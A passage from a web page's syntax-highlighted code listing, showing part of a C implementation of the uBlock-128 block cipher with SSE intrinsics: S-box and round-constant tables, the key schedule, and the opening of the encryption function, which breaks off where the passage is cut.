class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;memory.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;emmintrin.h&gt;</span><span class=\"comment\">//sse2 header file(include sse header file)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pmmintrin.h&gt;</span> <span class=\"comment\">//SSE3(include emmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;tmmintrin.h&gt;</span><span class=\"comment\">//SSSE3(include pmmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;smmintrin.h&gt;</span><span class=\"comment\">//SSE4.1(include tmmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;nmmintrin.h&gt;</span><span class=\"comment\">//SSE4.2(include smmintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;intrin.h&gt;</span><span class=\"comment\">//(include immintrin.h)  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;chrono&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;thread&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">__m128i S     = _mm_setr_epi8(<span class=\"number\">0x7</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x5</span>);</span><br><span class=\"line\">__m128i S_Inv = _mm_setr_epi8(<span class=\"number\">0xc</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">__m128i con = _mm_set1_epi8(<span class=\"number\">0x0f</span>);</span><br><span class=\"line\">__m128i A1 = _mm_setr_epi8(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">8</span>);\t</span><br><span class=\"line\">__m128i A2 = _mm_setr_epi8(<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>);\t\t</span><br><span class=\"line\">__m128i A3 = _mm_setr_epi8(<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>);\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> Subkey[<span class=\"number\">17</span>][<span class=\"number\">32</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> RC[<span class=\"number\">16</span>][<span class=\"number\">16</span>] = &#123;<span class=\"number\">0x9</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xf</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x2</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x8</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xc</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x4</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x5</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x7</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x3</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xb</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xa</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x8</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xd</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x7</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x3</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xa</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">uBlock_128_KeySchedule</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key)</span><span class=\"comment\">// 密钥生成函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t__m128i SK = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">3</span>, <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">5</span>, <span class=\"number\">11</span>, <span class=\"number\">9</span>, <span class=\"number\">15</span>, <span class=\"number\">13</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c1 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c2 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>);\t\t</span><br><span class=\"line\">\t__m128i c3 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c4 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c5 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c6 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\">\t__m128i c7 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>);\t</span><br><span class=\"line\">\t__m128i c8 = _mm_setr_epi8(<span class=\"number\">6</span>,<span class=\"number\">0</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">1</span>,<span class=\"number\">15</span>,<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">4</span>,<span class=\"number\">9</span>,<span class=\"number\">12</span>,<span class=\"number\">2</span>,<span class=\"number\">11</span>,<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">14</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i state1, state2, k, t1, t2, t3, t4;  </span><br><span class=\"line\"></span><br><span class=\"line\">\tstate2 = _mm_loadu_si128((__m128i*)key);</span><br><span class=\"line\">\tstate1 = _mm_srli_epi16(state2, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_and_si128(state1, con);</span><br><span class=\"line\">\tstate2 = _mm_and_si128(state2, con);</span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c1);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c2);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c3);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c4);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)Subkey[<span class=\"number\">0</span>], state1);</span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)(Subkey[<span class=\"number\">0</span>] + <span class=\"number\">16</span>), state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">1</span>; i &lt;= <span class=\"number\">16</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(state1, c8);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)RC[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\tk = _mm_xor_si128(k, state1);</span><br><span class=\"line\">\t\tt1 =  _mm_shuffle_epi8(S, k);</span><br><span class=\"line\">\t\tt2 = _mm_shuffle_epi8(SK, k);</span><br><span class=\"line\">\t\tt3 = _mm_shuffle_epi8(t1, c5);</span><br><span class=\"line\">\t\tt4 = _mm_shuffle_epi8(t2, c6);</span><br><span class=\"line\">\t\tk = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tk = _mm_xor_si128(k, state2);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(state1, c7);</span><br><span class=\"line\">\t\tstate1 = k;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t_mm_storeu_si128((__m128i*)Subkey[i], state1);</span><br><span class=\"line\">\t\t_mm_storeu_si128((__m128i*)(Subkey[i] + <span class=\"number\">16</span>), state2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">uBlock_128_Encrypt</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *plain, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cipher, <span class=\"type\">int</span> round)</span><span class=\"comment\">//uBlock加密函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t__m128i L1 = _mm_setr_epi8(<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>);\t\t</span><br><span class=\"line\">\t__m128i L2 = _mm_setr_epi8(<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c1 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c2 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>);\t\t</span><br><span class=\"line\">\t__m128i c3 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c4 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c5 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span 